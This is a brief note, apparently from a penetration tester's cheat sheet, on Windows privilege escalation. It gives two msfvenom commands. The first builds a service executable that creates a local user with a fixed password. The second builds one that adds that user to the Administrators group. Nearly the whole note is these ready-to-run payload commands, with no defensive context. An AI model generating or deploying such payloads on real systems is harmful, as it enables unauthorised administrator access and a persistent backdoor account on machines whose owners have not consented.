Test this with an add user payload if we can't add current user to admin group or change admin password
Also use exe-service payload- it can work in both cases but it makes sense to use an exe-service payload.

  msfvenom -p windows/adduser USER=test PASS=Easyas123! -f exe-service -o adduser.exe
  
Then:

  msfvenom -p windows/x64/exec CMD="cmd.exe /c 'net localgroup Administrators test /add'" -f exe-service -o admuser.exe
